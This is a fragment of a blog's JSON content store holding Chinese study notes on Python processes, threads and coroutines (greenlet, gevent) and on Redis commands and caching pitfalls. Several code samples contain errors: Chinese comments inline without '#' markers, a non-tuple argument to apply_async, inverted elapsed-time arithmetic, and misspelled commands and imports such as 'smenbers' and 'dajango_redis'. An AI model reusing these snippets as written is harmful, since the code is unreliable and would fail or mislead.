punctuation\">(</span>Thread<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">info2</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"---info2----\"</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">info3</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"---info3----\"</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token comment\"># 特别重要:只会调用run</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"---info1----\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    info <span class=\"token operator\">=</span> Prison<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    info<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"协程\"><a href=\"#协程\" class=\"headerlink\" title=\"协程\"></a>协程</h2><h3 id=\"yield协程\"><a href=\"#yield协程\" class=\"headerlink\" title=\"yield协程\"></a>yield协程</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> time\n<span class=\"token keyword\">def</span> <span class=\"token function\">info1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'-----1-----'</span><span class=\"token punctuation\">)</span>\n        time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">yield</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">info2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'-----2-----'</span><span class=\"token punctuation\">)</span>\n        time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">yield</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    in1 <span class=\"token operator\">=</span> info1<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    in2 <span class=\"token operator\">=</span> info2<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>  一定要用循环来切换\n        <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>in1<span class=\"token punctuation\">)</span>\n        <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>in2<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"greenlet协程\"><a href=\"#greenlet协程\" class=\"headerlink\" title=\"greenlet协程\"></a>greenlet协程</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> greenlet <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">import</span> time\n<span class=\"token keyword\">def</span> <span class=\"token function\">info1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'-----1-----'</span><span class=\"token punctuation\">)</span>\n        t2<span class=\"token punctuation\">.</span>switch<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> 使用greenlet协程必须要使用switch来切换\n        time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">info2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'-----2-----'</span><span class=\"token punctuation\">)</span>\n        t1<span class=\"token punctuation\">.</span>switch<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span>\nt1 <span class=\"token operator\">=</span> greenlet<span class=\"token punctuation\">(</span>info1<span class=\"token punctuation\">)</span> 创建一个对象\nt2 <span class=\"token operator\">=</span> greenlet<span class=\"token punctuation\">(</span>info2<span class=\"token punctuation\">)</span>\nt1<span class=\"token punctuation\">.</span>switch<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> 开始调用<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"gevent协程-最大的有点就是利用延时切换任务，充分利用cpu\"><a href=\"#gevent协程-最大的有点就是利用延时切换任务，充分利用cpu\" class=\"headerlink\" title=\"gevent协程(最大的有点就是利用延时切换任务，充分利用cpu)\"></a>gevent协程(最大的有点就是利用延时切换任务，充分利用cpu)</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">import gevent\ndef f1(n):\n    for i in range(n):\n        print(&quot;----f1----&quot;, i)\n        gevent.sleep(0.3) # 用于延时，不用time.sleep(),而是用gevent.sleep()\ndef f2(n):\n    for i in range(n):\n        print(&quot;----f2----&quot;, i)\n        gevent.sleep(0.3)\ndef f3(n):\n    for i in range(n):\n        print(&quot;----f3----&quot;, i)\n        gevent.sleep(0.3)\ndef main():\n    # 使用方法一、\n    t1 &#x3D; gevent.spawn(f1, 5)\n    t2 &#x3D; gevent.spawn(f2, 5)\n    t3 &#x3D; gevent.spawn(f3, 5)\n    t1.join()\n    t2.join()\n    t3.join()\n\n    # 使用方法二、\n    gevent.joinall([\n        gevent.spawn(f1, 5),\n        gevent.spawn(f2, 5),\n        gevent.spawn(f3, 5)\n    ])\n\n\nif __name__ &#x3D;&#x3D; &quot;__main__&quot;:\n    main()<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"进程\"><a href=\"#进程\" class=\"headerlink\" title=\"进程\"></a>进程</h2><h3 id=\"multiprocessing下面\"><a href=\"#multiprocessing下面\" class=\"headerlink\" title=\"multiprocessing下面\"></a>multiprocessing下面</h3><ul>\n<li>1、Process:创建一个进程,参数有target，args,args是一个元组作为形式参数</li>\n<li>2、start:运行这个进程</li>\n<li>3、Queue:是队列，先进先出，和栈相反，Queue(20)就是说可以存放20个数据，数据部分类型。用full来判断是否满，用empty来判断是否空了用put来往里面放数据,用get来拿数据</li>\n<li>4、Pool:进程池，实现重复利用，进程任务数量太多或者任务数不确定的时候，最好使用进程池。如果有10000个进程，那么创建一个只有10个任务的进程池，就可以反复一万次来完成任务，避免系统崩溃,利用for循环来创建进程，apply_async(函数，(参数，参数,),创建之后立刻关闭close，并且紧跟其后用join，否则程序死掉’</li>\n</ul>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> multiprocessing <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">import</span> time\n<span class=\"token keyword\">import</span> random\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">info</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    t_start <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span>random<span class=\"token punctuation\">.</span>randrange<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    t_stop <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">执行时长:</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>t_start<span class=\"token operator\">-</span>t_stop<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span>\n    \n<span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span> Pool<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        p<span class=\"token punctuation\">.</span>apply_async<span class=\"token punctuation\">(</span>info<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    p<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"线程\"><a href=\"#线程\" class=\"headerlink\" title=\"线程\"></a>线程</h2><h3 id=\"threading下面\"><a href=\"#threading下面\" class=\"headerlink\" title=\"threading下面\"></a>threading下面</h3><ul>\n<li>   1、Thread:创建一个线程对像，可以有两个参数 target= ，args=，args是一个元组</li>\n<li>   2、start：使用创建的线程</li>\n<li>   3、enumerate:用来查看有多少个线程在跑，用len来显示个数，用while来控制</li>\n<li>   4、Lock:互斥锁，可以实例出一个实力对象，require是上锁，release是解锁</li>\n</ul>\n<blockquote>\n<p>说明一点:在用c语言编写的python解释器中执行python的线程的时候，会涉及到GIL锁，GIL锁就是同一时刻只有一个程序在执行，这是一种假的多任务，只有线程在有，解决GIL锁的方法</p>\n<ul>\n<li>1、换解释器</li>\n<li>2、换线程语言(因为python基本可以执行其他的所有语言，c、c++、java等)</li>\n</ul>\n</blockquote>\n<h3 id=\"线程共享全局变量\"><a href=\"#线程共享全局变量\" class=\"headerlink\" title=\"线程共享全局变量\"></a>线程共享全局变量</h3><ul>\n<li>  1、如果在线程代码中对全局变量进行修改，要用global,也就是说要令全局变量’等于’一个什么东西的时候必须用global，如：i+=1，用变量的方法来修改的不用使用global，如list.append()</li>\n<li>  2、如果没有要对全局变量进行修改，就不用global申明，只是使用全局变量也不用使用global</li>\n<li>  3、全局变量在线程中也可以共享</li>\n<li>  4、有可能在多线程中可能会出现资源争夺（用Local互斥锁来解决，互斥锁不要太多，用以产生死锁）</li>\n</ul>\n<h3 id=\"Thread的实例对象还可以是一个类\"><a href=\"#Thread的实例对象还可以是一个类\" class=\"headerlink\" title=\"Thread的实例对象还可以是一个类\"></a>Thread的实例对象还可以是一个类</h3><ul>\n<li>  1、让这个类来继承threading.Thread这个类</li>\n<li>  2、用的时候直接 对象名 = 这个类（）</li>\n<li> 3、start的使用：这个类的对象名.start</li>\n<li> 4、（最重要):这个类中只能进行多线程的就是run函数，所以如果要对类创建多线程，那么必须有run函数，类当中的其他函数只能通过 self.函数名 的形式申明在run函数中</li>\n</ul>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> threading <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">import</span> time\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Prison</span><span class=\"token punctuation\">(</span>Thread<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">info2</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"---info2----\"</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">info3</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"---info3----\"</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token comment\"># 特别重要:只会调用run</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"---info1----\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    info <span class=\"token operator\">=</span> Prison<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    info<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"协程\"><a href=\"#协程\" class=\"headerlink\" title=\"协程\"></a>协程</h2><h3 id=\"yield协程\"><a href=\"#yield协程\" class=\"headerlink\" title=\"yield协程\"></a>yield协程</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> time\n<span class=\"token keyword\">def</span> <span class=\"token function\">info1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'-----1-----'</span><span class=\"token punctuation\">)</span>\n        time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">yield</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">info2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'-----2-----'</span><span class=\"token punctuation\">)</span>\n        time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">yield</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    in1 <span class=\"token operator\">=</span> info1<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    in2 <span class=\"token operator\">=</span> info2<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>  一定要用循环来切换\n        <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>in1<span class=\"token punctuation\">)</span>\n        <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>in2<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"greenlet协程\"><a href=\"#greenlet协程\" class=\"headerlink\" title=\"greenlet协程\"></a>greenlet协程</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> greenlet <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">import</span> time\n<span class=\"token keyword\">def</span> <span class=\"token function\">info1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'-----1-----'</span><span class=\"token punctuation\">)</span>\n        t2<span class=\"token punctuation\">.</span>switch<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> 使用greenlet协程必须要使用switch来切换\n        time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">info2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'-----2-----'</span><span class=\"token punctuation\">)</span>\n        t1<span class=\"token punctuation\">.</span>switch<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span>\nt1 <span class=\"token operator\">=</span> greenlet<span class=\"token punctuation\">(</span>info1<span class=\"token punctuation\">)</span> 创建一个对象\nt2 <span class=\"token operator\">=</span> greenlet<span class=\"token punctuation\">(</span>info2<span class=\"token punctuation\">)</span>\nt1<span class=\"token punctuation\">.</span>switch<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> 开始调用<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"gevent协程-最大的有点就是利用延时切换任务，充分利用cpu\"><a href=\"#gevent协程-最大的有点就是利用延时切换任务，充分利用cpu\" class=\"headerlink\" title=\"gevent协程(最大的有点就是利用延时切换任务，充分利用cpu)\"></a>gevent协程(最大的有点就是利用延时切换任务，充分利用cpu)</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">import gevent\ndef f1(n):\n    for i in range(n):\n        print(&quot;----f1----&quot;, i)\n        gevent.sleep(0.3) # 用于延时，不用time.sleep(),而是用gevent.sleep()\ndef f2(n):\n    for i in range(n):\n        print(&quot;----f2----&quot;, i)\n        gevent.sleep(0.3)\ndef f3(n):\n    for i in range(n):\n        print(&quot;----f3----&quot;, i)\n        gevent.sleep(0.3)\ndef main():\n    # 使用方法一、\n    t1 &#x3D; gevent.spawn(f1, 5)\n    t2 &#x3D; gevent.spawn(f2, 5)\n    t3 &#x3D; gevent.spawn(f3, 5)\n    t1.join()\n    t2.join()\n    t3.join()\n\n    # 使用方法二、\n    gevent.joinall([\n        gevent.spawn(f1, 5),\n        gevent.spawn(f2, 5),\n        gevent.spawn(f3, 5)\n    ])\n\n\nif __name__ &#x3D;&#x3D; &quot;__main__&quot;:\n    main()<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>"},{"title":"redis基础","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2023-01-19T07:32:03.000Z","password":"5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87","summary":"redis基础","_content":"## Redis\n### NoSQL一种新出现的数据库(not only sql)\n```text\n1、不认识sql语句\n2、存储结构和关系型数据库中的关系表完全不同，nosql存储的数据都是kv（key-value）形式\n3、nosql的世界没有一种通用的语言，每一种nosql数据库都有自己的api和语法，以及应用场景\n4、nosql的产品种类多\n\n### Redis数据库\n1、支持数据的持久化\n2、支持简单的key-vlaue，还有list,set,zset,hash等类型\n3、支持备份，master-slave模式的数据备份\n```\n### Redis数据类型\n```text\n1、字符串string\n2、哈希hash\n3、列表list\n4、集合set\n5、有序集合zset\n```\n\n\n### Redis操作行为\n```\n1、保存\n2、修改\n3、获取\n4、删除\n```\n\n#### string类型\n\n> redis中最基础的数据类型，是二进制安全的，可以接受任何格式的数据，照片、json等\n\n-\t定义字符串:set key value,  setex key sconds value 这种方式设置过期时间，  mset key value key value设置多个\n-\t查看字符串:get key，mget key1 key2,获取多个\n-\t字符串的追加:append key value\n-\t查看所有的键:keys 通配符\n-\t查看键是否存在:exists key\n-\t查看键值的类型:type key\n-\t设置过期时间:expire key sconds\n-\t查看键的有效时间:ttl key\n-\t删除:del key1 key2……\n\n#### hash类型\n> hash本来就有key，hash的value就是一个字符串string，所以还有一个string的key\n-\t定义哈希类型:hset key string-key value，  hmset key string-key1 value1 string-key2 value2一次设置多个，一个hash中可以有多个value\n-\t查看指定键的值：hkey key\n-\t获取hash的值:hget key string-key,   hmget key string-key1 string-key2……多个值，  hvals key获取所有的值\n-\t删除:del key，删除整个hash，hdel key string-key删除对应的hash值\n\n#### 列表类型（list）\n-\t定义：lpush key value vlaue2……从左侧插入，rpush key value value2…… 从右侧插入，linsert key before或者after 某一个已经存在的value value value2……\n-\t获取:lrange key start stop\n-\t修改:lset key index new_value\n-\t删除:lrem key count value,count是一个数字，表示删除多少个（相同元素），整数表示前往后，负数从后往前，为0的时候表示删除所有给定的value\n\n\n#### 集合类型(set)\n> 不能重复，无序\n-\t定义:sadd key value value2……\n-\t获取:smenbers key获取所有元素\n-\t删除:srem key value value2……\n\t\n\n#### 有序集合(zset)\n> 有序权重从小到大排序\n-\t定义:zadd key 权重 value 权重2 value2……,权重就是数字\n-\t获取:zrange key start stop\n-\t获取给定的权值范围元素:zrangebyscore key start stop\n-\t获取权值:zscore key value\n-\t删除指定的元素:zrem key value1 value2……\n-\t删除给定权值范围元素:zremrangebyscore key start stop\n\n\n#### Redis和python的交互:\n\n##### python基本使用\n```python\nfrom redis import *\nxx = StrictRedis(host = 'xxx', port = 6379, db = num)\n```\n> 对xx进行操作\n\n##### django中使用Redis:多数用来 存储session\n```python\npip install django-redis-sessions\n\n# setting.py中设置：\nSESSION_ENGINE = 'redis_sessions.session'\nSESSION_REDIS_HOST = 'localhost'\nSESSION_REDIS_PORT = 6379\nSESSION_REDIS_DB = 2\nSESSION_REDIS_PASSWORD = ''\nSESSION_REDIS_PREFIX = 'session'\n# 这样就可以将原本存储在django的数据库中的session存储到redis中，存储成hash\n\n# 配置成caches:\nCACHES = {\n    \"default\": {\n    \"BACKEND\": \"django_redis.cache.RedisCache\",\n    \"LOCATION\": \"redis://127.0.0.1:6379/2\",\n    \"OPTIONS\": {\n        \"CLIENT_CLASS\": \"django_redis.client.DefaultClient\",\n    }\n    }\n}\n\n# 使用\nfrom dajango_redis import get_redis_connection\nxxx = get_redis_connection('default')\n# 可以使用redis中的所有方法\n```\n\t\n\t\n\t\n### redis的问题\n>\t缓存穿透：用户查询一个数据库中一定不会有的数据，比如id=-1,因为数据库中没有这个数据，所以不会保存到缓存中，下次再来访问的时候，缓存中没有，又会去数据库中查询，这样就增加了数据库的压力，如果被黑客发现了，就会利用这个漏洞来攻击数据库，可能会让数据库崩溃，解决办法就是就算没有查到，也放到缓存中，只不过值为null，然后把过期时间设置的短一点。\n\t\n>\t缓存雪崩：意思就是大量的缓存数据同时失效（过期），这个时候，又有大并发的请求的话，就会对数据库加大访问压力，可能让数据库崩溃，解决办法就是，可以设置不同的过期时间，如果是双十一这种可以设置永不过期。\n\t\n>\t缓存击穿：意思就是用户频繁会访问的key，比如，双十一有一个活动见做一分钱领取iphone13 pro max，在非常多的人访问的时候，在这种大并发的情况下，如果缓存中的这个key过期了，那么对数据的压力就太大了，解决办法就是设置这个key用不过期。\n","source":"_posts/redis基础.md","raw":"---\ntitle: redis基础\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-01-19 15:32:03\npassword: 5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87\nsummary: redis基础\ntags: redis\ncategories: db\n---\n## Redis\n### NoSQL一种新出现的数据库(not only sql)\n```text\n1、不认识sql语句\n2、存储结构和关系型数据库中的关系表完全不同，nosql存储的数据都是kv（key-value）形式\n3、nosql的世界没有一种通用的语言，每一种nosql数据库都有自己的api和语法，以及应用场景\n4、nosql的产品种类多\n\n### Redis数据库\n1、支持数据的持久化\n2、支持简单的key-vlaue，还有list,set,zset,hash等类型\n3、支持备份，master-slave模式的数据备份\n```\n### Redis数据类型\n```text\n1、字符串string\n2、哈希hash\n3、列表list\n4、集合set\n5、有序集合zset\n```\n\n\n### Redis操作行为\n```\n1、保存\n2、修改\n3、获取\n4、删除\n```\n\n#### string类型\n\n> redis中最基础的数据类型，是二进制安全的，可以接受任何格式的数据，照片、json等\n\n-\t定义字符串:set key value,  setex key sconds value 这种方式设置过期时间，  mset key value key value设置多个\n-\t查看字符串:get key，mget key1 key2,获取多个\n-\t字符串的追加:append key value\n-\t查看所有的键:keys 通配符\n-\t查看键是否存在:exists key\n-\t查看键值的类型:type key\n-\t设置过期时间:expire key sconds\n-\t查看键的有效时间:ttl key\n-\t删除:del key1 key2……\n\n#### hash类型\n> hash本来就有key，hash的value就是一个字符串string，所以还有一个string的key\n-\t定义哈希类型:hset key string-key value，  hmset key string-key1 value1 string-key2 value2一次设置多个，一个hash中可以有多个value\n-\t查看指定键的值：hkey key\n-\t获取hash的值:hget key string-key,   hmget key string-key1 string-key2……多个值，  hvals key获取所有的值\n-\t删除:del key，删除整个hash，hdel key string-key删除对应的hash值\n\n#### 列表类型（list）\n-\t定义：lpush key value vlaue2……从左侧插入，rpush key value value2…… 从右侧插入，linsert key before或者after 某一个已经存在的value value value2……\n-\t获取:lrange key start stop\n-\t修改:lset key index new_value\n-\t删除:lrem key count value,count是一个数字，表示删除多少个（相同元素），整数表示前往后，负数从后往前，为0的时候表示删除所有给定的value\n\n\n#### 集合类型(set)\n> 不能重复，无序\n-\t定义:sadd key value value2……\n-\t获取:smenbers 